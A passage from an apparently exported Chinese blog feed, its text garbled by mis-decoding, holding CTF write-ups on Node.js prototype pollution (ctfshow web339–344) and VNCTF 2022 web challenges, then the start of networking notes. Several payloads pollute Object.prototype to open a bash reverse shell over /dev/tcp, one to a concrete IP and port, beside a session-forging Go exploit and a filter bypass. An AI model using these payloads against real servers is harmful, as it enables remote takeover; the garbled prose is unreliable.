alt="image-20220222171015673"></p><p>Functioné‡Œçš„queryå˜é‡æ²¡æœ‰è¢«å¼•ç”¨</p><p>å¦‚æœæˆ‘ä»¬å¯ä»¥åˆ©ç”¨åŸå‹é“¾æ§åˆ¶queryçš„å€¼ï¼Œé‚£ä¹ˆå°±èƒ½å®ç°åå¼¹shellçš„æ“ä½œ</p><p>ä½†æ˜¯è¿™ä¸ªæ˜¯å˜é‡ä¸æ˜¯å˜é‡çš„å±æ€§ï¼Œä¹Ÿèƒ½æ±¡æŸ“å—</p><p>ç­”æ¡ˆæ˜¯å¯ä»¥çš„</p><pre class="language-none"><code class="language-none">å› ä¸ºæ‰€æœ‰å˜é‡çš„æœ€é¡¶å±‚éƒ½æ˜¯objectï¼Œå½“å‰ç¯å¢ƒæ²¡æœ‰ï¼Œå®ƒä¼šç›´æ¥å»å¯»æ‰¾Objectå¯¹è±¡çš„å±æ€§å½“ä¸­æ˜¯å¦æœ‰è¿™ä¸ªé”®å€¼å¯¹æ˜¯å¦å­˜åœ¨</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220519170152098.png" alt="image-20220519170152098"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payload</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;æœåŠ¡å™¨IP&#x2F;ç›‘å¬ç«¯å£ 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;</code></pre><p>åœ¨loginé¡µé¢postä¸€ä¸‹è¿›è¡Œæ±¡æŸ“</p><p>ç„¶åè®¿é—®ä¸€ä¸‹apié¡µé¢è§¦å‘query</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222203151541.png" alt="image-20220222203151541"></p><h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><p>ç™»å½•éƒ¨åˆ†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222210758117.png" alt="image-20220222210758117"></p><p>copyå‡½æ•°ï¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222210810876.png" alt="image-20220222210810876"></p><p>è¿™é“é¢˜ä¸web339åˆ©ç”¨ç‚¹æ˜¯ç›¸åŒçš„ï¼Œæˆ‘ä»¬åŒæ ·è¦åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“æ¥æ§åˆ¶queryçš„å€¼è¾¾åˆ°åå¼¹shellçš„ç›®çš„ã€‚ä½†æ˜¯éœ€è¦å‘ä¸Šæ±¡æŸ“ä¸¤çº§æ‰èƒ½åˆ°è¾¾Objectå¯¹è±¡</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222210739146.png" alt="image-20220222210739146"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222210925672.png" alt="image-20220222210925672"></p><p>æ‰€ä»¥æˆ‘ä»¬çš„payloadä¸º</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;æœåŠ¡å™¨IP&#x2F;ç›‘å¬ç«¯å£ 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre><p>åŒæ ·ä¼ å…¥ä¹‹åè®¿é—®ä¸€ä¸‹apié¡µé¢å°±è¡Œ</p><h2 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h2><p>æ²¡æœ‰äº†api.js</p><p>æ‰€ä»¥åªèƒ½ç”¨web339çš„é‚£ä¸ªéé¢„æœŸè§£ï¼Œåªæ˜¯è¦è·Ÿweb340ä¸€æ ·å‘ä¸Šæ±¡æŸ“ä¸¤çº§</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;);var _llama2&quot;&#125;&#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222225203273.png" alt="image-20220222225203273"></p><h2 id="web342-web343"><a href="#web342-web343" class="headerlink" title="web342-web343"></a>web342-web343</h2><p>åŒæ ·æ˜¯æ¨¡æ¿å¼•æ“çš„rceï¼Œä¸è¿‡ä¸æ˜¯ä¹‹å‰çš„ejsï¼Œè€Œæ˜¯jade</p><p><a href="https://xz.aliyun.com/t/7025">å†æ¢ JavaScript åŸå‹é“¾æ±¡æŸ“åˆ° RCE - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">å‡ ä¸ªnodeæ¨¡æ¿å¼•æ“çš„åŸå‹é“¾æ±¡æŸ“åˆ†æ | L0nm4r (lonmar.cn)</a></p><p><a href="https://xz.aliyun.com/t/7075#toc-0">ejsåŸå‹æ±¡æŸ“rceåˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>ç”¨ä¸€ä¸ªpayloadéƒ½èƒ½æ‰“</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;117.50.172.142&#x2F;8082 0&gt;&amp;1\&quot;&#39;)&quot;&#125;&#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220223144941601.png" alt="image-20220223144941601"></p><h2 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h2><p>ä»£ç ï¼š</p><pre class="language-none"><code class="language-none">router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag &#x3D; &#39;flag_here&#39;;  if(req.url.match(&#x2F;8c|2c|\,&#x2F;ig))&#123;  res.end(&#39;where is flag :)&#39;);  &#125;  var query &#x3D; JSON.parse(req.query.query);  if(query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;&amp;&amp;query.isVIP&#x3D;&#x3D;&#x3D;true)&#123;  res.end(flag);  &#125;else&#123;  res.end(&#39;where is flag. :)&#39;);  &#125;&#125;);</code></pre><p>å¦‚æœæ²¡æœ‰è¿‡æ»¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥ä¼ å…¥</p><pre class="language-none"><code class="language-none">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code></pre><p>å°±è¡Œï¼Œä½†æ˜¯é¢˜ç›®æŠŠé€—å·å’Œä»–çš„urlç¼–ç è¿‡æ»¤äº†</p><p>è¿™æ—¶å°±è¦å°è¯•ç”¨&amp;ç»•è¿‡</p><pre class="language-none"><code class="language-none">nodejs ä¼šæŠŠåŒåå‚æ•°ä»¥æ•°ç»„çš„å½¢å¼å­˜å‚¨ï¼Œå¹¶ä¸” JSON.parse å¯ä»¥æ­£å¸¸è§£æ</code></pre><p>æ‰€ä»¥æœ€ç»ˆpayloadä¸º</p><pre class="language-none"><code class="language-none">?query&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125; </code></pre><p>æŠŠcä¹Ÿç¼–ç çš„åŸå› æ˜¯é˜²æ­¢å’ŒåŒå¼•å·çš„urlç¼–ç æ„æˆ%22c</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220223150552411.png" alt="image-20220223150552411"></p><p>1</p><pre class="language-none"><code class="language-none">const crypto &#x3D; require(&#39;crypto&#39;);const express &#x3D; require(&#39;express&#39;);const session &#x3D; require(&quot;express-session&quot;);const app &#x3D; express();const jwt &#x3D; require(&quot;jsonwebtoken&quot;);const fs &#x3D; require(&quot;fs&quot;)const bodyParser &#x3D; require(&#39;body-parser&#39;)session_secret &#x3D; Math.random().toString(36).substr(2);const cookieParser &#x3D; require(&#39;cookie-parser&#39;);const &#123;json&#125; &#x3D; require(&quot;express&quot;);app.use(cookieParser(session_secret));app.use(bodyParser.json())app.use(session(&#123; secret: session_secret, resave: true, saveUninitialized: true &#125;))const secret &#x3D; crypto.randomBytes(18).toString(&#39;hex&#39;);app.post(&#39;&#x2F;register&#39;, function (req, res) &#123;    const username &#x3D; req.body.name;    if ( username &#x3D;&#x3D; &#39;admin&#39;)&#123;        res.send(&quot;admin not allowed&quot;);        return    &#125;    const token &#x3D; jwt.sign(&#123;username&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);    res.send(&#123;token: token&#125;);&#125;);app.post(&#39;&#x2F;login&#39;, function (req, res) &#123;    const token &#x3D; req.body.auth    try &#123;        jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;,function (_,user)&#123;            console.log(user)            req.session.user &#x3D; &#123;&quot;username&quot;:user.username&#125;        &#125;);    &#125;catch (e) &#123;        res.send(&quot;login error&quot;)        return    &#125;    res.send(req.session.user.username + &quot; login successfully&quot;)&#125;);app.post(&#39;&#x2F;readfile&#39;, function (req, res) &#123;    if (req.session.user.username !&#x3D;&#x3D; &quot;admin&quot;)&#123;        res.send(&quot;only admin can get flag&quot;)        return    &#125;    if (typeof req.body[&quot;secret&quot;] !&#x3D;&#x3D; &quot;number&quot;)&#123;        &#x2F;&#x2F;ä»…å…è®¸16è¿›å­—ç¬¦ä¸²        let regex_pattern &#x3D; &#x2F;^[a-fA-F\d.]+$&#x2F;        if (!regex_pattern.test(req.body[&quot;secret&quot;]))&#123;            res.send(&quot;only valid string under 16 radix allowed&quot;)            return        &#125;    &#125;    if (req.body.file &amp;&amp; parseInt(req.body[&quot;secret&quot;],16) &#x3D;&#x3D;&#x3D; 158 &amp;&amp; parseFloat(req.body[&quot;secret&quot;]) &lt; 9)&#123;        let file_param &#x3D; JSON.stringify(req.body.file)        if (file_param.includes(&quot;flag&quot;) || file_param.includes(&quot;fd&quot;)) &#123;            res.send(&quot;flag not allowed&quot;)            return        &#125;else &#123;            res.setHeader(&quot;Content-Type&quot;, &quot;text&#x2F;html&quot;);            res.send(fs.readFileSync(req.body.file || &quot;app.js&quot;).toString())            return        &#125;    &#125;    res.send(&quot;try to read &#x2F;flag&quot;)&#125;);app.get(&#39;&#x2F;&#39;, function (req, res) &#123;    res.send(&#39;see &#96;&#x2F;src&#96;&#39;);&#125;);app.get(&#39;&#x2F;src&#39;, function (req, res) &#123;    var data &#x3D; fs.readFileSync(&#39;app.js&#39;);    res.send(data.toString());&#125;);app.listen(3000, function () &#123;    console.log(&#39;start listening on port 3000&#39;);&#125;);</code></pre><p>1</p>]]></content>
      
      
      
        <tags>
            
            <tag> webå­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTFå¤ç°</title>
      <link href="/2022/02/13/VNCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/02/13/VNCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="GameV4-0"><a href="#GameV4-0" class="headerlink" title="GameV4.0"></a>GameV4.0</h2><p>çº¯ç­¾åˆ°é¢˜</p><p>æºç é‡Œæ‰¾flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220214122029407.png"></p><p>base64è§£ç </p><h2 id="gocalc0"><a href="#gocalc0" class="headerlink" title="gocalc0"></a>gocalc0</h2><p>éé¢„æœŸè§£ï¼š</p><pre class="language-none"><code class="language-none">&#123;&#123;.&#125;&#125;</code></pre><p>æŸ¥æºç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220214125228998.png" alt="image-20220214125228998"></p><p>flagåœ¨/flagè·¯å¾„ï¼Œå°è¯•å»è®¿é—®</p><p>ç„¶åæç¤ºflagåœ¨sessionä¸­</p><p>å¯¹sessionè¿›è¡Œbase64è§£ç (ç¬¬äºŒæ¬¡è§£ç å¦‚æœå…¨æ”¾è¿›å»è§£ä¸å‡ºå†…å®¹ï¼Œè¦ä¸€ç‚¹ä¸€ç‚¹è¯•)</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220214125352267.png" alt="image-20220214125352267"></p><p>é¢„æœŸè§£ï¼š</p><p>æ‹¿åˆ°æºç ä¹‹åæ ¹æ®æºç å†™ä¸ªexp</p><pre class="language-none"><code class="language-none">package mainimport (_ &quot;embed&quot;&quot;fmt&quot;&quot;os&quot;&quot;reflect&quot;&quot;strings&quot;&quot;text&#x2F;template&quot;&quot;github.com&#x2F;gin-contrib&#x2F;sessions&quot;&quot;github.com&#x2F;gin-contrib&#x2F;sessions&#x2F;cookie&quot;&quot;github.com&#x2F;gin-gonic&#x2F;gin&quot;&quot;github.com&#x2F;maja42&#x2F;goval&quot;)&#x2F;&#x2F;go:embed template&#x2F;index.htmlvar tpl string&#x2F;&#x2F;go:embed main.govar source stringtype Eval struct &#123;E string &#96;json:&quot;e&quot; form:&quot;e&quot; binding:&quot;required&quot;&#96;&#125;func (e Eval) Result() (string, error) &#123;eval :&#x3D; goval.NewEvaluator()result, err :&#x3D; eval.Evaluate(e.E, nil, nil)if err !&#x3D; nil &#123;return &quot;&quot;, err&#125;t :&#x3D; reflect.ValueOf(result).Type().Kind()if t &#x3D;&#x3D; reflect.Int &#123;return fmt.Sprintf(&quot;%d&quot;, result.(int)), nil&#125; else if t &#x3D;&#x3D; reflect.String &#123;return result.(string), nil&#125; else &#123;return &quot;&quot;, fmt.Errorf(&quot;not valid type&quot;)&#125;&#125;func (e Eval) String() string &#123;res, err :&#x3D; e.Result()if err !&#x3D; nil &#123;fmt.Println(err)res &#x3D; &quot;invalid&quot;&#125;return fmt.Sprintf(&quot;%s &#x3D; %s&quot;, e.E, res)&#125;func render(c *gin.Context) &#123;session :&#x3D; sessions.Default(c)var his stringif session.Get(&quot;history&quot;) &#x3D;&#x3D; nil &#123;his &#x3D; &quot;&quot;&#125; else &#123;his &#x3D; session.Get(&quot;history&quot;).(string)&#125;fmt.Println(strings.ReplaceAll(tpl, &quot;&#123;&#123;result&#125;&#125;&quot;, his))t, err :&#x3D; template.New(&quot;index&quot;).Parse(strings.ReplaceAll(tpl, &quot;&#123;&#123;result&#125;&#125;&quot;, his))if err !&#x3D; nil &#123;fmt.Println(err)c.String(500, &quot;internal error&quot;)return&#125;if err :&#x3D; t.Execute(c.Writer, map[string]string&#123;&quot;s0uR3e&quot;: source,&#125;); err !&#x3D; nil &#123;fmt.Println(err)&#125;&#125;func main() &#123;port :&#x3D; os.Getenv(&quot;PORT&quot;)if port &#x3D;&#x3D; &quot;&quot; &#123;port &#x3D; &quot;8080&quot;&#125;r :&#x3D; gin.Default()store :&#x3D; cookie.NewStore([]byte(&quot;woW_you-g0t_sourcE_co6e&quot;))r.Use(sessions.Sessions(&quot;session&quot;, store))r.GET(&quot;&#x2F;&quot;, func(c *gin.Context) &#123;render(c)&#125;)r.GET(&quot;&#x2F;flag&quot;, func(c *gin.Context) &#123;session :&#x3D; sessions.Default(c)session.Set(&quot;FLAG&quot;, os.Getenv(&quot;FLAG&quot;))session.Save()c.String(200, &quot;flag is in your session&quot;)&#125;)r.POST(&quot;&#x2F;&quot;, func(c *gin.Context) &#123;session :&#x3D; sessions.Default(c)var his stringif session.Get(&quot;history&quot;) &#x3D;&#x3D; nil &#123;his &#x3D; &quot;&quot;&#125; else &#123;his &#x3D; session.Get(&quot;history&quot;).(string)&#125;eval :&#x3D; Eval&#123;&#125;if err :&#x3D; c.ShouldBind(&amp;eval); err &#x3D;&#x3D; nil &#123;his &#x3D; his + eval.String() + &quot;&lt;br&#x2F;&gt;&quot;&#125;session.Set(&quot;history&quot;, his)session.Save()render(c)&#125;)r.Run(fmt.Sprintf(&quot;:%s&quot;, port))&#125;</code></pre><p>expï¼š</p><pre class="language-go" data-language="go"><code class="language-go">package mainimport (   _ &quot;embed&quot;   &quot;fmt&quot;   &quot;github.com&#x2F;gin-contrib&#x2F;sessions&quot;   &quot;github.com&#x2F;gin-contrib&#x2F;sessions&#x2F;cookie&quot;   &quot;github.com&#x2F;gin-gonic&#x2F;gin&quot;   &quot;os&quot;)func main() &#123;   port :&#x3D; os.Getenv(&quot;PORT&quot;)   if port &#x3D;&#x3D; &quot;&quot; &#123;      port &#x3D; &quot;8080&quot;   &#125;   r :&#x3D; gin.Default()   store :&#x3D; cookie.NewStore([]byte(&quot;woW_you-g0t_sourcE_co6e&quot;))   r.Use(sessions.Sessions(&quot;session&quot;, store))   r.GET(&quot;&#x2F;&quot;, func(c *gin.Context) &#123;      session :&#x3D; sessions.Default(c)      println(session.Get(&quot;FLAG&quot;).(string))   &#125;)   r.Run(fmt.Sprintf(&quot;:%s&quot;, port))&#125;</code></pre><p>è¿™éƒ¨åˆ†ç­‰å­¦äº†goä¹‹åå†çœ‹çœ‹ï¼Œå…ˆæ”¾ç€</p><h2 id="newcalc0"><a href="#newcalc0" class="headerlink" title="newcalc0"></a>newcalc0</h2><p>è€ƒç‚¹ï¼š<strong>åŸå‹æ±¡æŸ“é€šè¿‡ console.table å±æ€§ï¼ˆä½ï¼‰ï¼ˆCVE-2022-21824ï¼‰</strong></p><p>ç”±äº console.table() å‡½æ•°çš„æ ¼å¼åŒ–é€»è¾‘ï¼Œå…è®¸ç”¨æˆ·æ§åˆ¶çš„è¾“å…¥ä¼ é€’ç»™ properties å‚æ•°åŒæ—¶ä¼ é€’ä¸€ä¸ªæ˜¯ä¸å®‰å…¨çš„å…·æœ‰è‡³å°‘ä¸€ä¸ªå±æ€§ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°çš„æ™®é€šå¯¹è±¡ï¼Œå¯ä»¥æ˜¯<code>__proto__</code>. åŸå‹æ±¡æŸ“çš„æ§åˆ¶éå¸¸æœ‰é™ï¼Œå› ä¸ºå®ƒåªå…è®¸ä¸ºå¯¹è±¡åŸå‹çš„æ•°å­—é”®åˆ†é…ä¸€ä¸ªç©ºå­—ç¬¦ä¸²ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220215115638665.png" alt="image-20220215115638665"></p><p>expï¼š <code>console.table([&#123; x : 1 &#125;], [ &quot;__proto__&quot; ]);</code></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220215115645015.png" alt="image-20220215115645015"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220215115655004.png" alt="image-20220215115655004"></p><h2 id="easyJava"><a href="#easyJava" class="headerlink" title="easyJava"></a>easyJava</h2><p>å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/vnctf/image-20220215115704939.png" alt="image-20220215115704939"></p><p>è¯»ä¸åˆ°flagï¼Œåº”è¯¥æ˜¯è¦é€šè¿‡è°ƒç”¨readflagæ¥è¯»å–flag</p><pre class="language-none"><code class="language-none">file?url&#x3D;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;WEB-INF&#x2F;classes&#x2F;</code></pre><p>åç¼–è¯‘çœ‹ä¸€ä¸‹æºç </p><p>Secr3t.jad</p><pre class="language-java" data-language="java"><code class="language-java">&#x2F;&#x2F; Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.&#x2F;&#x2F; Jad home page: http:&#x2F;&#x2F;www.kpdus.com&#x2F;jad.html&#x2F;&#x2F; Decompiler options: packimports(3) &#x2F;&#x2F; Source File Name:   Secr3t.javapackage util;import java.io.*;import org.apache.commons.lang3.RandomStringUtils;public class Secr3t&#123;    private Secr3t()    &#123;    &#125;    public static String getKey()    &#123;        return Key;    &#125;    public static StringBuffer getFlag()    &#123;        InputStream in;        BufferedReader read;        Flag &#x3D; new StringBuffer();        in &#x3D; null;        try        &#123;            in &#x3D; Runtime.getRuntime().exec(&quot;&#x2F;readflag&quot;).getInputStream();        &#125;        catch(IOException e)        &#123;            e.printStackTrace();        &#125;        read &#x3D; new BufferedReader(new InputStreamReader(in));        for(String line &#x3D; null; (line &#x3D; read.readLine()) !&#x3D; null;)            Flag.append((new StringBuilder()).append(line).append(&quot;\n&quot;).toString());        IOException e;        try        &#123;            in.close();            read.close();        &#125;        &#x2F;&#x2F; Misplaced declaration of an exception variable        catch(IOException e)        &#123;            e.printStackTrace();            System.out.println(&quot;Secr3t : io exception!&quot;);        &#125;        break MISSING_BLOCK_LABEL_176;        e;        e.printStackTrace();        try        &#123;            in.close();            read.close();        &#125;        &#x2F;&#x2F; Misplaced declaration of an exception variable        catch(IOException e)        &#123;            e.printStackTrace();            System.out.println(&quot;Secr3t : io exception!&quot;);        &#125;        break MISSING_BLOCK_LABEL_176;        Exception exception;        exception;        try        &#123;            in.close();            read.close();        &#125;        catch(IOException e)        &#123;            e.printStackTrace();            System.out.println(&quot;Secr3t : io exception!&quot;);        &#125;        throw exception;        return Flag;    &#125;    public static boolean check(String checkStr)    &#123;        return &quot;vnctf2022&quot;.equals(checkStr);    &#125;    private static final String Key &#x3D; RandomStringUtils.randomAlphanumeric(32);    private static StringBuffer Flag;&#125;</code></pre><p>HelloWorldServlet.jad</p><pre class="language-java" data-language="java"><code class="language-java">package servlet;import javax.servlet.annotation.*;import entity.*;import javax.servlet.http.*;import java.io.*;import java.util.*;import util.*;import javax.servlet.*;@WebServlet(name &#x3D; &quot;HelloServlet&quot;, urlPatterns &#x3D; &#123; &quot;&#x2F;evi1&quot; &#125;)&#x2F;&#x2F;æ¯”èµ›çš„æ—¶å€™ç”¨çš„jadåç¼–è¯‘çš„æ²¡è¿™å—ï¼Œè™½ç„¶ä¹‹åæŸ¥æ—¥å¿—æ‰¾åˆ°äº†è·¯å¾„public class HelloWorldServlet extends HttpServlet&#123;    private volatile String name;    private volatile String age;    private volatile String height;    User user;        public HelloWorldServlet() &#123;        this.name &#x3D; &quot;m4n_q1u_666&quot;;        this.age &#x3D; &quot;666&quot;;        this.height &#x3D; &quot;180&quot;;    &#125;        public void init() throws ServletException &#123;        this.user &#x3D; new User(this.name, this.age, this.height);    &#125;        protected void doGet(final HttpServletRequest req, final HttpServletResponse resp) throws ServletException, IOException &#123;        final String reqName &#x3D; req.getParameter(&quot;name&quot;);        if (reqName !&#x3D; null) &#123;            this.name &#x3D; reqName;        &#125;        if (Secr3t.check(this.name)) &#123;            this.Response(resp, &quot;no vnctf2022!&quot;);            return;        &#125;        if (Secr3t.check(this.name)) &#123;            this.Response(resp, &quot;The Key is &quot; + Secr3t.getKey());        &#125;    &#125;        protected void doPost(final HttpServletRequest req, final HttpServletResponse resp) throws ServletException, IOException &#123;        final String key &#x3D; req.getParameter(&quot;key&quot;);        final String text &#x3D; req.getParameter(&quot;base64&quot;);        if (Secr3t.getKey().equals(key) &amp;&amp; text !&#x3D; null) &#123;            final Base64.Decoder decoder &#x3D; Base64.getDecoder();            final byte[] textByte &#x3D; decoder.decode(text);            final User u &#x3D; (User)SerAndDe.deserialize(textByte);            if (this.user.equals((Object)u)) &#123;                this.Response(resp, &quot;Deserialize\u2026\u2026 Flag is &quot; + Secr3t.getFlag().toString());            &#125;        &#125;        else &#123;            this.Response(resp, &quot;KeyError&quot;);        &#125;    &#125;        private void Response(final HttpServletResponse resp, final String outStr) throws IOException &#123;        final ServletOutputStream out &#x3D; resp.getOutputStream();        out.write(outStr.getBytes());        out.flush();        out.close();    &#125;&#125;</code></pre><p>ç•™ä¸ªå‘ï¼Œä¸ä¼šäº†ï¼Œæš‘å‡å¼€å§‹å­¦javaå†æ¥è¡¥ï¼ˆ</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ictå­¦ä¹ ç¬”è®°</title>
      <link href="/2022/01/24/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/01/24/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°æ®é€šä¿¡ç½‘ç»œåŸºç¡€"><a href="#æ•°æ®é€šä¿¡ç½‘ç»œåŸºç¡€" class="headerlink" title="æ•°æ®é€šä¿¡ç½‘ç»œåŸºç¡€"></a>æ•°æ®é€šä¿¡ç½‘ç»œåŸºç¡€</h1><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>é€šä¿¡ï¼šäººä¸äººï¼Œäººä¸ç‰©ï¼Œç‰©ä¸ç‰©ä¹‹é—´é€šè¿‡æŸç§åª’ä»‹å’Œè¡Œä¸ºè¿›è¡Œçš„ä¿¡æ¯ä¼ é€’ä¸äº¤æµ</p><p>ç½‘ç»œé€šä¿¡ï¼šç»ˆç«¯è®¾å¤‡ä¹‹é—´é€šè¿‡è®¡ç®—æœºç½‘ç»œè¿›è¡Œçš„é€šä¿¡</p><h2 id="ä¿¡æ¯ä¼ é€’è¿‡ç¨‹"><a href="#ä¿¡æ¯ä¼ é€’è¿‡ç¨‹" class="headerlink" title="ä¿¡æ¯ä¼ é€’è¿‡ç¨‹"></a>ä¿¡æ¯ä¼ é€’è¿‡ç¨‹</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124122207098.png" alt="image-20220124122207098"></p><p>æ•°æ®è¢«æ‰“åŒ…æˆåŸå§‹çš„æ•°æ®è½½è·ï¼Œå¹¶æ·»åŠ ä¸€å®šä¿¡æ¯(ç›®çš„åœ°å€)çš„å¤´éƒ¨å’Œå°¾éƒ¨å½¢æˆæŠ¥æ–‡(å°è£…)ï¼ŒæŠ¥æ–‡é€šè¿‡ç½‘çº¿åˆ°è¾¾ç½‘å…³ï¼Œç½‘å…³å¯¹æŠ¥æ–‡è¿›è¡Œ&quot;è§£å°è£…&quot;ï¼Œè¯»å–ç›®çš„åœ°å€ï¼Œå†é‡æ–°å°è£…ï¼Œæ ¹æ®ä¸åŒçš„ç›®çš„åœ°å€é€å¾€ä¸åŒçš„è·¯ç”±å™¨ï¼ŒæŠ¥æ–‡ç”±æ­¤ç¦»å¼€æœ¬åœ°ç½‘ç»œï¼Œè¿›å…¥internetçš„å¹²é“è¿›è¡Œä¼ è¾“ï¼Œåè¿›å…¥ç›®çš„åœ°å€æ‰€åœ¨çš„æœ¬åœ°é“¾è·¯ï¼Œç”±æœ¬åœ°é“¾è·¯çš„ç½‘å…³æˆ–è·¯ç”±å™¨å†è¿›è¡Œè§£å°è£…å’Œå°è£…ï¼Œå¹¶æ ¹æ®ç›®çš„åœ°å€è§‰å¾—å‘å¾€ç›¸åº”çš„ä¸‹ä¸€å°è·¯ç”±å™¨ï¼Œæœ€ç»ˆåˆ°è¾¾ç›®çš„è®¡ç®—æœºæ‰€åœ¨çš„ç½‘ç»œçš„ç½‘å…³ï¼Œå†è¿›è¡Œè§£å°è£…å’Œå°è£…ï¼Œæ ¹æ®ç›®çš„åœ°å€å‘å¾€ç›¸åº”çš„è®¡ç®—æœºã€‚è®¡ç®—æœºæ”¶åˆ°æŠ¥æ–‡åå¯¹å…¶è¿›è¡Œæ ¡éªŒå¤„ç†ï¼Œæ ¡éªŒæ— è¯¯åï¼Œæ¥æ”¶æŠ¥æ–‡ï¼Œå¹¶å°†å…¶ä¸­çš„æ•°æ®è½½è·äº¤ç”±ç›¸åº”çš„åº”ç”¨ç¨‹åºè¿›è¡Œå¤„ç†ã€‚</p><h2 id="å¸¸è§æœ¯è¯­"><a href="#å¸¸è§æœ¯è¯­" class="headerlink" title="å¸¸è§æœ¯è¯­"></a>å¸¸è§æœ¯è¯­</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ict%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220124122239944.png" alt="image-20220124122239944"></p><p>â€¢ æ•°æ®è½½è·ï¼šå¯ä»¥ç†è§£ä¸ºæœ€ç»ˆæƒ³è¦ä¼ é€’çš„ä¿¡æ¯ï¼Œä½†å®é™…ä¸Šï¼Œåœ¨å…·æœ‰å±‚æ¬¡åŒ–ç»“æ„çš„é€šä¿¡è¿‡ç¨‹ä¸­ï¼Œ ä¸Šä¸€å±‚åè®®ä¼ é€’ç»™ä¸‹ä¸€å±‚åè®®çš„æ•°æ®å•å…ƒï¼ˆæŠ¥æ–‡ï¼‰éƒ½å¯ä»¥ç§°ä¹‹ä¸ºä¸‹ä¸€å±‚åè®®çš„æ•°æ®è½½è·ã€‚ 